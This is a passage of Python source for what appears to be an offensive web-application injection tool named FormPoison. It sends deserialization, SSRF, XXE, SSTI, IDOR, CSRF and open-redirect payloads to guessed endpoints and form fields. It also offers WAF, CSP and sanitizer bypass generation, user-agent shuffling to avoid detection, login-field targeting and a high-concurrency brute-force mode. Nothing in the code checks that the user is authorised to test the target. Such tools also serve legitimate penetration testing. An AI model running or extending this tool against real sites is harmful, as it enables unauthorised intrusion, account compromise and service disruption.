    console.print(f"[blue]Testing {len(deserialization_payloads)} deserialization payloads[/blue]")
    
    results = []
    
    # Rozszerzona lista endpointów
    endpoints = [
        '/api', '/api/v1', '/api/v2', '/rest', '/rest/api', '/json',
        '/service', '/services', '/ajax', '/data', '/export',
        '/servlet', '/struts', '/spring', '/soap', '/xmlrpc',
        '/upload', '/import', '/export', '/save', '/load'
    ]
    
    tested_endpoints = 0
    vulnerable_endpoints = 0
    
    for endpoint in endpoints:
        test_url = url.rstrip('/') + endpoint
        
        try:
            console.print(f"[dim]Testing deserialization endpoint: {test_url}[/dim]")
            
            endpoint_results = await test_all_forms(
                test_url, 
                deserialization_payloads, 
                "DESERIALIZATION", 
                cookies, 
                user_agents,
                method="POST",
                proxies=proxies, 
                ssl_cert=ssl_cert, 
                ssl_key=ssl_key, 
                ssl_verify=ssl_verify,
                brute_mode=brute_mode,
                max_concurrent=max_concurrent,
                timeout=timeout
            )
            
            tested_endpoints += 1
            
            # check if there is a vuln
            endpoint_vulnerabilities = []
            for result in endpoint_results:
                if isinstance(result, dict) and result.get('vulnerabilities'):
                    endpoint_vulnerabilities.extend(result['vulnerabilities'])
                    results.append(result)
            
            if any('CONFIRMED' in v for v in endpoint_vulnerabilities):
                vulnerable_endpoints += 1
                console.print(f"[bold red]💀 VULNERABLE DESERIALIZATION ENDPOINT: {test_url}[/bold red]")
                
        except Exception as e:
            if args.verbose:
                console.print(f"[dim]Endpoint {test_url} failed: {e}[/dim]")
            continue

    console.print(f"[green]Tested {tested_endpoints} deserialization endpoints[/green]")
    if vulnerable_endpoints > 0:
        console.print(f"[bold red]🎯 Found {vulnerable_endpoints} vulnerable deserialization endpoints![/bold red]")
    else:
        console.print(f"[yellow]No vulnerable deserialization endpoints found[/yellow]")
    
    return results

async def test_ssrf_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify):
    console.print("[yellow]🎯 Running targeted SSRF tests[/yellow]")
    
    ssrf_payloads = [p for p in payloads if 'SSRF' in p['category']]
    
    if ssrf_payloads:
        console.print(f"[blue]Testing {len(ssrf_payloads)} SSRF payloads[/blue]")
        
        soup = BeautifulSoup(content, 'html.parser')
        url_inputs = soup.find_all('input', {'type': 'url'}) + soup.find_all('input', {'name': lambda x: x and 'url' in x.lower()})
        
        for url_input in url_inputs:
            await test_input_field(url, ssrf_payloads, "SSRF", cookies, user_agents, url_input,
                                 method="GET", proxies=proxies, ssl_cert=ssl_cert, ssl_key=ssl_key, ssl_verify=ssl_verify)

async def test_xxe_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify):
    console.print("[yellow]🎯 Running targeted XXE tests[/yellow]")
    
    xxe_payloads = [p for p in payloads if 'XXE' in p['category']]
    
    if xxe_payloads:
        console.print(f"[blue]Testing {len(xxe_payloads)} XXE payloads[/blue]")
        
        xml_endpoints = ['/api/xml', '/soap', '/xmlrpc', '/rest', '/feed']
        for endpoint in xml_endpoints:
            test_url = url.rstrip('/') + endpoint
            try:
                headers = {'Content-Type': 'application/xml'}
                await test_with_custom_headers(test_url, xxe_payloads, cookies, user_agents, headers,
                                             proxies, ssl_cert, ssl_key, ssl_verify)
            except:
                continue

async def test_ssti_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify):
    console.print("[yellow]🎯 Running targeted SSTI tests[/yellow]")
    
    ssti_payloads = [p for p in payloads if 'SSTI' in p['category']]
    
    if ssti_payloads:
        console.print(f"[blue]Testing {len(ssti_payloads)} SSTI payloads[/blue]")
        await test_all_forms(url, ssti_payloads, "SSTI", cookies, user_agents,
                           proxies=proxies, ssl_cert=ssl_cert, ssl_key=ssl_key, ssl_verify=ssl_verify)

async def test_idor_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify):
    console.print("[yellow]🎯 Running targeted IDOR tests[/yellow]")
    
    idor_payloads = [p for p in payloads if 'IDOR' in p['category']]
    
    if idor_payloads:
        console.print(f"[blue]Testing IDOR with {len(idor_payloads)} payloads[/blue]")
        
        id_params = ['id', 'user', 'account', 'document', 'file']
        for param in id_params:
            test_url = f"{url}?{param}="
            await test_idor_endpoint(test_url, idor_payloads, cookies, user_agents,
                                   proxies, ssl_cert, ssl_key, ssl_verify)

async def test_csrf_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify):
    console.print("[yellow]🎯 Running targeted CSRF tests[/yellow]")
    
    csrf_payloads = [p for p in payloads if 'CSRF' in p['category']]
    
    if csrf_payloads:
        console.print(f"[blue]Testing CSRF with {len(csrf_payloads)} payloads[/blue]")
        await test_all_forms(url, csrf_payloads, "CSRF", cookies, user_agents,
                           proxies=proxies, ssl_cert=ssl_cert, ssl_key=ssl_key, ssl_verify=ssl_verify)

async def test_open_redirect_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify):
    console.print("[yellow]🎯 Running targeted open redirect tests[/yellow]")
    
    redirect_payloads = [p for p in payloads if 'REDIRECT' in p['category']]
    
    if redirect_payloads:
        console.print(f"[blue]Testing open redirect with {len(redirect_payloads)} payloads[/blue]")
        
        redirect_params = ['redirect', 'return', 'url', 'next', 'target']
        for param in redirect_params:
            test_url = f"{url}?{param}="
            await test_input_field(test_url, redirect_payloads, "REDIRECT", cookies, user_agents, 
                                 {'name': param}, method="GET", proxies=proxies, ssl_cert=ssl_cert, 
                                 ssl_key=ssl_key, ssl_verify=ssl_verify)

async def test_race_condition_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify):
    console.print("[yellow]🎯 Running targeted race condition tests[/yellow]")
    # Implementation needed

async def test_buffer_overflow_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify):
    console.print("[yellow]🎯 Running targeted buffer overflow tests[/yellow]")
    # Implementation needed

async def test_with_custom_headers(url, payloads, cookies, user_agents, headers, proxies, ssl_cert, ssl_key, ssl_verify):
    try:
        ssl_context = ssl.create_default_context()
        if ssl_cert and ssl_key:
            ssl_context.load_cert_chain(ssl_cert, ssl_key)

        async with aiohttp.ClientSession() as session:
            for payload in payloads:
                data = {'input': payload['inputField']}
                async with session.post(url, data=data, headers=headers, cookies=cookies,
                                      proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
                    content = await response.text()
                    vulnerabilities = analyze_response(content, response.headers, payload['category'], payload['inputField'])
                    
                    if vulnerabilities:
                        console.print(f"[red]Vulnerability found: {vulnerabilities}[/red]")
    except Exception as e:
        console.print(f"[red]Error testing with custom headers: {e}[/red]")

async def test_idor_endpoint(url, payloads, cookies, user_agents, proxies, ssl_cert, ssl_key, ssl_verify):
    try:
        ssl_context = ssl.create_default_context()
        if ssl_cert and ssl_key:
            ssl_context.load_cert_chain(ssl_cert, ssl_key)

        async with aiohttp.ClientSession() as session:
            for payload in payloads:
                test_url = url + payload['inputField']
                async with session.get(test_url, cookies=cookies,
                                     proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
                    content = await response.text()
                    
                    if response.status == 200 and len(content) > 100:
                        console.print(f"[red]Potential IDOR found at: {test_url}[/red]")
    except Exception as e:
        console.print(f"[red]Error testing IDOR: {e}[/red]")


        
async def main():
    console.clear()
    parser = argparse.ArgumentParser(description="Over 3500 payloads included!")
    parser.add_argument("url", help="Form URL")
    parser.add_argument("--no-banner", action="store_true", help="Skip banner animation on startup")
    parser.add_argument("--interactive", action="store_true", help="Interactive mode - more control over injections.")
    parser.add_argument("--scan", action="store_true", help="Perform a quick scan of the website")
    parser.add_argument("--max-urls", type=int, default=100, help="Maximum number of URLs to scan (default: 100)")
    parser.add_argument("--max-depth", type=int, default=3, help="Maximum depth of scanning (default: 3)")
    parser.add_argument("--workers", type=int, default=10, help="Number of workers for scanning (default: 10)")
    parser.add_argument("--auto-target", action="store_true", 
                   help="Automatically generate and use targeted payloads based on Go scanner results")
    parser.add_argument("-t", "--threat", choices=["HTML", "Java", "SQL"], help="Threat type to test (HTML, Java, SQL)")
    parser.add_argument("-p", "--payloads", default="payloads.json", help="JSON file with payloads")
    parser.add_argument("--cookies", help="Cookies: 'key1=value1; key2=value2'")
    parser.add_argument("-ua","--user-agent", help="Specify User-Agent: 'random' for shuffling, or specific agent from list")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://login:password@proxy.com)")
    parser.add_argument("--ssl-cert", help="Path to SSL certificate file (e.g., cert.pem)")
    parser.add_argument("--ssl-key", help="Path to SSL private key file (e.g., key.pem)")
    parser.add_argument("--ssl-verify", action="store_true", help="Verify SSL certificate (default: False)")
    parser.add_argument("--mXSS", action="store_true", help="Test Mutation XSS vulnerabilities")
    parser.add_argument('--brute', action='store_true', help='Brute force mode - maximum speed')
    parser.add_argument('--concurrent', type=int, default=50, help='Max concurrent requests (brute: 10-500, default: 50)')
    parser.add_argument('--timeout', type=float, default=15.0, help='Request timeout in seconds (brute: 3-60, default: 15)')
    parser.add_argument('--batch-size', type=int, default=100, help='Requests per batch (brute: 10-1000, default: 100)')
    parser.add_argument('--batch-delay', type=float, default=1.0, help='Delay between batches in seconds (brute: 0-10, default: 1)')
    parser.add_argument('--retries', type=int, default=2, help='Max retries on failure (brute: 1-5, default: 2)')
    parser.add_argument("--method", default="POST", choices=["GET", "POST", "PUT", "DELETE"], help="HTTP method to use (default: POST)")
    parser.add_argument("--filter", help="Filter payloads by user-defined patterns (e.g., '<meta>, <script>, onclick')")
    parser.add_argument("--login", action="store_true", help="Enable login testing for login and password fields")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose mode")
    parser.add_argument("--verbose-all", action="store_true", help="Enable verbose mode with response content")
    parser.add_argument("--fieldname", help="Specific input field name to test (e.g., 'username')")
    parser.add_argument("--filemode", action="store_true", help="Test filename XSS in file upload forms")
    parser.add_argument("-s", "--seconds", type=float, default=0, help="Delay between requests in seconds")
    parser.add_argument("--waf-bypass", action="store_true", help="Generate WAF bypass payloads")
    parser.add_argument("--csp-bypass", action="store_true", help="Generate CSP bypass payloads")
    parser.add_argument("--sanitizer-bypass", action="store_true", help="Generate HTML sanitizer bypass payloads")
    parser.add_argument("--encoder-bypass", action="store_true", help="Generate encoder bypass payloads")
    parser.add_argument("--encoding-confusion", action="store_true", help="Generate encoding confusion payloads")
    parser.add_argument("--size-overflow", action="store_true", help="Generate size overflow payloads")
    if len(sys.argv) == 1:
        console.print("[bold red]Enter valid command[/bold red]")
        parser.print_help()
        sys.exit()

    args = parser.parse_args()
    
    if not args.no_banner:
        console.clear()
        show_banner()
    else:
        console.print("[dim]FormPoison v.1.0.1.[/dim]")
    default_user_agent = "FormPoison/v.1.0.1"
    cookies = parse_cookies(args.cookies) if args.cookies else {}
    proxies = parse_proxy(args.proxy) if args.proxy else None
    user_agents = [default_user_agent]
    shuffle_user_agents = [
        # Chrome - Windows
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",

        # Chrome - macOS
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",

        # Chrome - Linux
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",

        # Firefox - Windows
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",

        # Firefox - macOS
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",

        # Firefox - Linux
        "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",

        # Safari - macOS
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15",

        # Safari - iOS
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",

        # Edge - Windows
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.0.0",

        # Edge - macOS
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",

        # Android - Chrome Mobile
        "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",

        # Android - Samsung Browser
        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36",

        # Opera
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 OPR/73.2.3816.54321",

        # Legacy browsers for compatibility
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
    ]

    if args.brute:
        console.print("[bold yellow]⚠️  BRUTE FORCE MODE ACTIVATED - USE WITH CAUTION! ⚠️[/bold yellow]")

        if args.concurrent < 10 or args.concurrent > 500:
            console.print(f"[yellow]Warning: --concurrent {args.concurrent} is outside recommended range 10-500[/yellow]")

        if args.timeout < 3 or args.timeout > 60:
            console.print(f"[yellow]Warning: --timeout {args.timeout} is outside recommended range 3-60 seconds[/yellow]")

        if args.batch_size < 10 or args.batch_size > 1000:
            console.print(f"[yellow]Warning: --batch-size {args.batch_size} is outside recommended range 10-1000[/yellow]")

        if args.batch_delay < 0 or args.batch_delay > 10:
            console.print(f"[yellow]Warning: --batch-delay {args.batch_delay} is outside recommended range 0-10 seconds[/yellow]")

        if args.retries < 1 or args.retries > 5:
            console.print(f"[yellow]Warning: --retries {args.retries} is outside recommended range 1-5[/yellow]")

        if args.concurrent > 200:
            console.print("[red]🚨 HIGH CONCURRENCY WARNING: May overwhelm the target server![/red]")

        if args.batch_delay < 0.5:
            console.print("[red]🚨 LOW DELAY WARNING: May trigger rate limiting or be detected as attack![/red]")

        if args.concurrent > 100 and args.batch_delay < 1.0:
            response = console.input("[bold red]🚨 EXTREME BRUTE FORCE: Are you sure? (y/N): [/bold red]")
            if response.lower() not in ('y', 'yes'):
                console.print("[bold yellow]Brute force cancelled.[/bold yellow]")
                sys.exit(0)

    if not args.url.startswith(('http://', 'https://')):
        response = console.input(f"You entered site '{args.url}' without https protocol provided[bold yellow] Switch to https? (Y/n): [/bold yellow]")
        if response.lower() in ('yes', 'y'):
            args.url = f'https://{args.url}'
            console.print(f"[bold green]Switched to HTTPS: {args.url}[/bold green]")
        else:
            console.print("[bold red]Keeping the original URL without HTTPS.[/bold red]")
    elif args.url.startswith('https://'):
        console.print(f"[bold green]URL already starts with HTTPS: {args.url}[/bold green]")
    else:
        console.print(f"[bold green]URL starts with HTTP: {args.url}[/bold green]")

    bypass_flags = {
        'waf_bypass': args.waf_bypass,
        'csp_bypass': args.csp_bypass,
        'sanitizer_bypass': args.sanitizer_bypass,
        'encoder_bypass': args.encoder_bypass,
        'encoding_confusion': args.encoding_confusion,
        'size_overflow': args.size_overflow
    }

    payloads = []

    if args.scan:
        console.print("[bold blue]Running Go scanner for deep vulnerability analysis...[/bold blue]")
        scan_report, attack_recommendations = go_scanner.scan_and_analyze(
            args.url, args.max_urls, args.max_depth, args.workers, args.proxy
        )

        if scan_report:
            # loading payloads and apply targeting
            base_payloads = load_payloads(args.payloads, {})
            targeted_payloads = go_scanner.generate_context_aware_payloads(
                scan_report, base_payloads, bypass_flags
            )
            
            # save them now
            with open("targeted_payloads.json", "w") as f:
                json.dump(targeted_payloads, f, indent=2)
                
            console.print(f"[green]Generated {len(targeted_payloads)} targeted payloads[/green]")
            console.print(f"[green]Saved to: targeted_payloads.json[/green]")
            
            # ask user 
            if attack_recommendations:
                response = console.input("[yellow]Proceed with targeted testing? (Y/n): [/yellow]")
                if response.lower() in ('', 'y', 'yes'):
                    # targeted payloads for automatic testing
                    payloads = targeted_payloads
                    args.scan = False  # default testing
                else:
                    sys.exit(0)
        else:
            console.print("[red]Scan failed, using standard payloads[/red]")
            payloads = load_payloads(args.payloads, bypass_flags)

    if args.auto_target:
        console.print("[bold blue]AUTO-TARGET MODE ACTIVATED[/bold blue]")
        console.print("[bold blue]Running Go scanner for targeted vulnerability analysis...[/bold blue]")
        scan_report, attack_recommendations = go_scanner.scan_and_analyze(
            args.url, args.max_urls, args.max_depth, args.workers, args.proxy
        )

        if scan_report:
            base_payloads = load_payloads(args.payloads, bypass_flags)
            targeted_payloads = generate_targeted_payloads(scan_report, base_payloads)
            
            with open("targeted_payloads.json", "w") as f:
                json.dump(targeted_payloads, f, indent=2)
                    
            console.print(f"[green]Generated {len(targeted_payloads)} targeted payloads based on scan results[/green]")
            console.print(f"[green]Saved to: targeted_payloads.json[/green]")
            
            payloads = targeted_payloads
            
            console.print("[bold green]🚀 Starting automated targeted testing...[/bold green]")
            await automated_targeted_testing(
                args.url, targeted_payloads, scan_report, cookies, user_agents,
                proxies=proxies, ssl_cert=args.ssl_cert, ssl_key=args.ssl_key, 
                ssl_verify=args.ssl_verify, brute_mode=args.brute,
                max_concurrent=args.concurrent, timeout=args.timeout
            )
            return
            
        else:
            console.print("[red]❌ Scan failed, falling back to standard payloads[/red]")
            payloads = load_payloads(args.payloads, bypass_flags)

    if not payloads and not args.scan:
        payloads = load_payloads(args.payloads, bypass_flags)

        if args.filter:
            filter_patterns = [pattern.strip() for pattern in args.filter.split(",")]
            payloads = filter_payloads(payloads, filter_patterns)
            console.print(f"[bold green]Filtered payloads based on patterns: {', '.join(filter_patterns)}[/bold green]")

        if args.threat:
            payloads = [payload for payload in payloads if payload['category'] == args.threat]
            console.print(f"[bold green]Filtered payloads for threat type: {args.threat}[/bold green]")

    if args.user_agent:
        if args.user_agent.lower() == 'random':
            user_agents = shuffle_user_agents
            random.shuffle(user_agents)
            console.print(f"[bold green]Using random User Agent[/bold green]")
        else:
            matching_agents = [user_agent for user_agent in shuffle_user_agents if args.user_agent.lower() in user_agent.lower()]
            if matching_agents:
                user_agents = [matching_agents[0]]
                console.print(f"[bold green]Using specified user agent: {user_agents[0]}[/bold green]")
            else:
                user_agents = [args.user_agent]
                console.print(f"[bold green]Using custom user agent: {args.user_agent}[/bold green]")
    else:
        console.print(f"[bold blue]Using default User Agent: {default_user_agent}[/bold blue]")

    page_content = None
    for current_user_agent in user_agents:
        page_content = await get_page_content(args.url, current_user_agent, proxies, args.ssl_cert, args.ssl_key, args.ssl_verify)
        if page_content:
            break

    if not page_content:
        console.print("[bold red]Failed to fetch page content.[/bold red]")
        sys.exit()

    input_fields = get_string_input_fields(page_content)
    console.print(f"[bold green]{len(input_fields)} String input fields found[/bold green]")

    if args.filemode:
        console.print("[bold blue]📁 Testing Filename XSS in upload forms...[/bold blue]")

        filemode_results = await test_filename_xss(
            args.url, input_fields, cookies, user_agents, proxies, args.ssl_verify
        )

        for result in filemode_results:
            console.print(f"[red]FILENAME XSS: {result['field']} → {result['filename']} → {result['vulnerability']}[/red]")

    if args.mXSS:
        console.print("[bold blue]🧬 Testing Mutation XSS vulnerabilities...[/bold blue]")

        # --login
        fields_to_test = input_fields
        if args.login:
            login_field = None
            password_field = None

            for field in input_fields:
                name = field.get('name', '').lower()
                id_ = field.get('id', '').lower()
                placeholder = field.get('placeholder', '').lower()
                field_type = field.get('type', '').lower()

                login_keywords = ['login', 'username', 'user', 'email', 'e-mail', 'mail', 'userid', 'user_id', 'loginname', 'account', 'mat-input-1']
                if any(keyword in name or keyword in id_ or keyword in placeholder for keyword in login_keywords):
                    login_field = field
                    console.print(f"[bold green]Found login field: name={name}, id={id_}, type={field_type}[/bold green]")

                password_keywords = ['password', 'pass', 'passwd', 'pwd', 'userpassword', 'user_pass']
                if any(keyword in name or keyword in id_ or keyword in placeholder for keyword in password_keywords):
                    if field_type == 'password':
                        password_field = field
                        console.print(f"[bold green]Found password field: name={name}, type={field_type}[/bold green]")

            if login_field and password_field:
                fields_to_test = [login_field, password_field]
                console.print(f"[yellow]Login mode: Testing login field '{login_field.get('name', '')}' and password field '{password_field.get('name', '')}'[/yellow]")
            else:
                console.print(f"[yellow]Login mode: Could not find both login and password fields, testing all {len(input_fields)} fields[/yellow]")
                fields_to_test = input_fields

        mXSS_results = await test_mutation_xss(
            args.url,
            fields_to_test,
            cookies,
            user_agents,
            args.method,
            proxies,
            args.ssl_cert,
            args.ssl_key,
            args.ssl_verify,
            args.verbose,
            args.verbose_all,
            args.seconds,
            payload_filters=args.filter
        )

        console.print("[bold green]mXSS testing completed.[/bold green]")

    # STANDARD TESTS
    if args.fieldname:
        field = find_field_by_name(input_fields, args.fieldname)
        if field:
            console.print(f"[bold yellow]Focusing only on input field: {args.fieldname}[/bold yellow]")
            await test_input_field(
                args.url, payloads, args.threat, cookies, user_agents, field,
                args.method, proxies, args.ssl_cert, args.ssl_key, args.ssl_verify,
                args.verbose, args.verbose_all, args.filter, args.seconds,
                brute_mode=args.brute,
                max_concurrent=args.concurrent,
                timeout=args.timeout,
                batch_size=args.batch_size,
                batch_delay=args.batch_delay,
                max_retries=args.retries
            )
        else:
            console.print(f"[bold red]No input field found with name '{args.fieldname}'[/bold red]")
            sys.exit(1)
    elif args.login:
        if len(user_agents) > 1:
            console.print(f"[bold green]Testing login fields with {len(user_agents)} shuffled User Agents[/bold green]")
        else:
            console.print(f"[bold green]Testing login fields with User Agent: {user_agents[0]}[/bold green]")
        await test_login_input_fields(
            args.url, payloads, cookies, user_agents, input_fields,
            proxies, args.verbose, args.verbose_all, args.seconds, args.filter,
            brute_mode=args.brute,
            max_concurrent=args.concurrent,
            timeout=args.timeout,
            batch_size=args.batch_size,
            batch_delay=args.batch_delay,
            max_retries=args.retries
        )

    if args.interactive:
        console.print("[bold blue]INTERACTIVE MODE[/bold blue]")
        await interactive_injection_mode(
            args.url, payloads, cookies, user_agents, args.method,
            proxies, args.ssl_cert, args.ssl_key, args.ssl_verify,
            args.verbose, args.verbose_all, args.seconds,
            brute_mode=args.brute,
            max_concurrent=args.concurrent,
            timeout=args.timeout,
            batch_size=args.batch_size,
            batch_delay=args.batch_delay,
            max_retries=args.retries
        )
        sys.exit(0)
    else:
        if len(user_agents) > 1:
            console.print(f"[bold green]Testing all forms with {len(user_agents)} shuffled User Agents[/bold green]")
        else:
            console.print(f"[bold green]Testing all forms with User Agent: {user_agents[0]}[/bold green]")
        await test_all_forms(
            args.url, payloads, args.threat, cookies, user_agents,
            args.method, proxies, args.ssl_cert, args.ssl_key, args.filter,
            args.ssl_verify, args.verbose, args.verbose_all, args.seconds,
            brute_mode=args.brute,
            max_concurrent=args.concurrent,
            timeout=args.timeout,
            batch_size=args.batch_size,
            batch_delay=args.batch_delay,
            max_retries=args.retries
        )


if __name__ == "__main__":
    asyncio.run(main())
